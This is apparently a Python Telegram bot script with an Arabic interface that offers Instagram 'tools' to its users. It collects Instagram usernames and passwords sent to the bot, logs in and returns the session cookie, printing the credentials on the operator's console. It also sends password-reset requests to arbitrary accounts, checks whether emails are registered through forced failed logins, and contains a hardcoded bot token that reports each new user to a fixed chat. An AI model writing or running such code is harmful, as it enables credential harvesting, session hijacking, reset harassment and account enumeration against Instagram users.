import requests,time
from time import sleep
import telebot
from telebot import types
import os
from uuid import uuid4 as uid
from secrets import token_hex
from OneClick import *
import requests
from uuid import uuid4 as uid
from secrets import token_hex
from OneClick import *
import requests
import telebot
from telebot import types
import instaloader
import HamodyTools
from HamodyTools import *
import os
from uuid import uuid4
ti=0
token = "5464838685:AAHKNPuTodh7zjBxecG2_q-8xSkfZBvWMP0"
print('- اذهب للبوت واضغط \n /start')
bot = telebot.TeleBot(token)
@bot.message_handler(commands = ['start'])
def Start(message):
 global ti
 m = message.text
 mm = message.chat.id
 Name = message.chat.first_name
 User = message.from_user.username 
 ID = message.chat.id
 bot.reply_to(message, """  
*- اهلا بك في بوت انستقرام ( {} )                             
• بـوت معلومات انستا\nريست انستا\nاستخراج سيشن ايدي انستجرام\nفحص ايميل انستا\nفحص يوزر انستا •
- USERNAME : [ @{} ]                                    
- ID : [ {} ]                                        *
""".format(Name,User,ID) , parse_mode = "markdown" , reply_markup = A)
 try:
 	fie =open('LoginBotAegos.txt','r').read().splitlines()
 	print('قديم')
 except FileNotFoundError:
 	with open('LoginBot.txt','a') as aegos0:
 		aegos0.write(f'Hi To Aegos Bot\n{User}')
 	ti+=1
 	requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id=1041016671&text=\nNew Login To Bot ❤ \nUser > @{User}\nName > {Name}\nID > {ID}\nعدد مستخدمين البوت - {ti}')
@bot.callback_query_handler(func=lambda call: True)
def answer(call):
	if call.data=="n1":
		n1(call.message)
	if call.data=="n2":
		n2(call.message)
	if call.data=="n3":
		n3(call.message)
	if call.data=="n4":
		n4(call.message)
	if call.data=="n5":
		n5(call.message)	
A = types.InlineKeyboardMarkup(row_width=2)
B = types.InlineKeyboardButton(text ="ᴿᴬᴳᴺᴬᴿ" , url = "https://t.me/PPGBB")
CH = types.InlineKeyboardButton(text ="Channel" , url = "https://t.me/PYTHON_PG")
D = types.InlineKeyboardButton(f"- معلومات انستا .",callback_data='n1')
F = types.InlineKeyboardButton(f"الحصول علئ سيشن انستا .",callback_data='n2')
G = types.InlineKeyboardButton(f"ارسال ريست انستا .",callback_data='n3')
H = types.InlineKeyboardButton(f"فحص يوزر انستا .",callback_data='n4')
J = types.InlineKeyboardButton(f"فحص متاح انستا .",callback_data='n5')
A.add(B,CH,D,F,G,H,J)		
def n1(message):
    mj=bot.send_message(message.chat.id,f"- ارسـل الـيـوزر . ")
    bot.register_next_step_handler(mj,ag)
def ag(message):
	global us,ti
	us = message.text
	api = f'https://i.instagram.com/api/v1/users/web_profile_info/?username={us}'
	head = {
'accept': '*/*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'ar',
f'cookie': 'mid=YwTJcAAEAAFcZMrQPSTepvHIl6wf; ig_did=E8C65BEE-FF49-420B-BCA5-3EB87DB30A83; ig_nrcb=1',
'origin': 'https://www.instagram.com',
'referer': 'https://www.instagram.com/',
'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': '"Windows"',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-site',
'user-agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
'x-asbd-id': '198387',
'x-ig-app-id': '936619743392459',
'x-ig-www-claim': '0',
	}
	g = requests.get(api,headers=head).json()
	if g['status']=='ok':
		ti+=1
		print(f'{ti} - Good')
		pc = str(g['data']["user"]["profile_pic_url"])
		nAEGOS = str(g['data']['user']['full_name'])
		bAEGOS = str(g['data']['user']['biography'])
		pAEGOS = str(g['data']['user']['edge_owner_to_timeline_media']['count'])
		fsAEGOS = str(g['data']['user']['edge_followed_by']['count'])
		fgAEGOS = str(g['data']['user']['edge_follow']['count'])
		iAEGOS = str(g['data']['user']['id'])
		re = requests.get(f"https://o7aa.pythonanywhere.com/?id={iAEGOS}").json()
		dAEGOS = re['date']
		bot.send_photo(message.chat.id,pc,caption=f'Name : {nAEGOS} \nPio : {bAEGOS} \nPosts : {pAEGOS} \nFollowers : {fsAEGOS} \nFollowing : {fgAEGOS} \nID : {iAEGOS} \nDate : {dAEGOS} \nBY : @PPGBB  -  @PYTHON_PG',parse_mode="html")
	else:
		bot.send_message(message.chat.id,'Error .')
def n2(message):
    hj=bot.send_message(message.chat.id,f"- اهلا بك عزيزي في بوت اضهار سيزن ايدي انستا\n———————×———————\nارسل حسابك الانستا الوهمي بهاذه الشكل ⬇️\n\n  username:password\nاو بهاذه الشكل\n  vvll_l:iioopp\n『 المبرمج : @PPGBB 』. ")
    bot.register_next_step_handler(hj,ses)
def ses(message):
   global usre,psse,ti
   try:    
    usre = message.text.split(':')[0]
    psse = message.text.split(':')[1]
    print(usre,psse)
    url = 'https://www.instagram.com/accounts/login/ajax/'
    headers = {
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9",
        "content-length": "385",
        "content-type": "application/x-www-form-urlencoded",
        "cookie": "csrftoken=Lk9Lfwj0Hp0T3zCBYwjoeGBUBjU1sVXC; mid=YSuaiwAEAAEzvEB8maY7IzJ6MDzJ; ig_did=07753880-8B96-4C09-93E9-BA39B801DD08",
        "origin": "https://www.instagram.com",
        "referer": "https://www.instagram.com/accounts/login/",
        "sec-ch-ua": '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
        "sec-ch-ua-mobile": "?0",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
        "x-asbd-id": "437806",
        "x-csrftoken": "Lk9Lfwj0Hp0T3zCBYwjoeGBUBjU1sVXC",
        "x-ig-app-id": "936619743392459",
        "x-ig-www-claim": "0",
        "x-instagram-ajax": "56f3c2d2a823",
        "x-requested-with": "XMLHttpRequest"
    }
    data = {
        "username": f"{usre}",
        "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:1613414957:{psse}",
        "queryParams": "{}",
        "optIntoOneTap": "false"
    }

    req_login = requests.post(url, headers=headers, data=data)
    if '"authenticated":true' in req_login.text:
    	bot.send_message(message.chat.id,"Done Login ✔️")
    	sess = req_login.cookies['sessionid']
    	bot.reply_to(message,text=f""" 	
USER = {usre}    	
PASS = {psse}
    	
#Sessionid سيزن ايدي    	

{sess}

━━━━━━━━⧪━━━━━━━━
By :- @PPGBB - @bsx_h2
""")
    elif '"message":"checkpoint_required"' in req_login.text:
    	bot.reply_to(message,text='هاذه الحساب سكيور 😵') 
    elif '"authenticated":false' in req_login.text:
    	bot.send_message(message.chat.id,"خطا في اليوزر او الباسورد ❌")
   except:
   	bot.reply_to(message,text="عذرا لايوجد هكذا زر ارجو اعادة المحاولة بشكل صحيح ⚠️")
def n3(message):
    hj=bot.send_message(message.chat.id,f"اهلا بك عزيزي في بوت ارسال الريست\n———————×———————\nا ارسل اليوزر\nالمبرمج 『 @PPGBB 』")
    bot.register_next_step_handler(hj,restins)
def restins(message):
   global msg,ti
   msg = message.text
   ggg = instaloader.Instaloader()
   profile = instaloader.Profile.from_username(ggg.context, msg)
   iddd = (profile.userid)
   try:
   	check = Hamody.Reset(message.text)
   	headers = {
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com',
        'Connection': 'Keep-Alive',
        'User-Agent': 'Instagram 6.12.1 Android (25/7.1.2; 160dpi; 383x680; LENOVO/Android-x86; 4242ED1; x86_64; android_x86_64; en_US)',

        'Accept-Language': 'en-US',
        'X-IG-Connection-Type': 'WIFI',
        'X-IG-Capabilities': 'AQ==',
							}
   	data = {
        'ig_sig_key_version': '4',
        "user_id":iddd
							}
   	res = requests.post('https://i.instagram.com/api/v1/accounts/send_password_reset/',headers=headers, data=data).json()
   	rs =str(res['obfuscated_email'])
   	if check==True:
   		bot.send_message(message.chat.id,f"تم توصيل الريست [ {message.text} ] ✅\nRest : {rs}")
   		print("•  تم توصيل الريست •")
   	else:
   		bot.send_message(message.chat.id,f"الريست خطا او الحساب سكيور [ {message.text} ] ❌")
   		print("\033[1;31m• ريست خطا •")
   except:
   	bot.reply_to(message,text="ارسل اليوزر بشكل صحيح رجاً ♻️-او-خطا 🚫") 
def n4(message):
    hj=bot.send_message(message.chat.id,f"اهلا بك عزيزي في بوت فحص اليوزر متاح او غير متاح\n———————×———————\nا ارسل اليوزر\nالمبرمج 『 @PPGBB 』")
    bot.register_next_step_handler(hj,userins)
def userins(message):
		global user,ti
		user = message.text
		url = requests.post('https://www.instagram.com/accounts/web_create_ajax/attempt/',headers ={'Host':'www.instagram.com',
'content-length':'85',
'sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="101"',
'x-ig-app-id':'936619743392459',
'x-ig-www-claim':'0',
'sec-ch-ua-mobile':'?0',
'x-instagram-ajax':'81f3a3c9dfe2',
'content-type':'application/x-www-form-urlencoded',
'accept':'*/*',
'x-requested-with':'XMLHttpRequest',
'x-asbd-id':'198387',
'user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Safari/537.36',
'x-csrftoken':'jzhjt4G11O37lW1aDFyFmy1K0yIEN9Qv',
'sec-ch-ua-platform':'"Linux"',
'origin':'https://www.instagram.com',
'sec-fetch-site':'same-origin',
'sec-fetch-mode':'cors',
'sec-fetch-dest':'empty',
'referer':'https://www.instagram.com/accounts/emailsignup/',
'accept-encoding':'gzip, deflate, br',
'accept-language':'en-IQ,en;q=0.9',
'cookie':'csrftoken=jzhjt4G11O37lW1aDFyFmy1K0yIEN9Qv',
'cookie':'mid=YtsQ1gABAAEszHB5wT9VqccwQIUL',
'cookie':'ig_did=227CCCC2-3675-4A04-8DA5-BA3195B46425',
'cookie':'ig_nrcb=1'},data=f'email=aakmnnsjskksmsnsn%40gmail.com&username={user}&first_name=&opt_into_one_tap=false')
		if '{"message":"feedback_required","spam":true,"feedback_title":"Try Again Later","feedback_message":"We limit how often you can do certain things on Instagram to protect our community. Tell us if you think we made a mistake.","feedback_url":"repute/report_problem/scraping/","feedback_appeal_label":"Tell us","feedback_ignore_label":"OK","feedback_action":"report_problem","status":"fail"}' in url.text:
			print('ERIR')		
		elif  '"errors": {"username":' in url.text or  '"code": "username_is_taken"' in url.text:
			bot.send_message(message.chat.id,f"اليوزر غير متاح [ {user} ] ❌")
		else:
			bot.send_message(message.chat.id,f"""
اليوزر متاح ✔️
☆━━━━━━━━━━━━━━☆

✇ 𝑼𝑺𝑬𝑹 ☛ {user}

☆━━━━━━━━━━━━━━☆""")
def n5(message):
    hj=bot.send_message(message.chat.id,f"اهلا بك عزيزي في بوت فحص ايميل الانستا متاح او لا\n———————×———————\nا ارسل اليوزر\nالمبرمج 『 @PPGBB 』")
    bot.register_next_step_handler(hj,instg)
def instg(message):
	global email,ti
	email = message.text
	url = 'https://b.i.instagram.com/api/v1/accounts/login/'
	headers = {'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)'}
	uid = str(uuid4())
	data = {
			'uuid':uid, 
			'password':'ffffdddddaaa666', 
			'username':'{}' .format(email),
			'device_id':uid, 
			'from_reg':'false', 
			'_csrftoken':'missing', 
			'login_attempt_countn':'0'
			}
	re = requests.post(url,headers=headers,data=data).text
	if ('"invalid_user"')in re:
		bot.send_message(message.chat.id,f"الايميل غير متاح في الانستا [ {email} ] ❌")
	elif ('"bad_password"') in re:
		bot.send_message(message.chat.id,f"الايميل متاح في الانستا [ {email} ] ✔️")
while True:
	try:
		bot.polling(none_stop=True)
	except Exception as e:
	       print(e)
	       sleep(10)   
